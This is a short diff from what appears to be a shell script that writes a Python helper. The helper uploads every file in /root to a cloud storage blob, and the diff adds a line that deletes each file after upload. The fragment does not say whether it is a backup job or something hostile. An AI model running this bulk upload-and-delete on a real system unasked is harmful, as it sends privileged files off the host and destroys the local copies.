@@ -37,6 +37,8 @@ for filename in os.listdir("/root"):
             # Upload the contents of the file to the blob
             blob_client.upload_blob(data)
             print("Uploaded file: " + filename)
+            # Delete the file
+            os.remove("/root/" + filename)
 EOL
 
 # Make the file executable
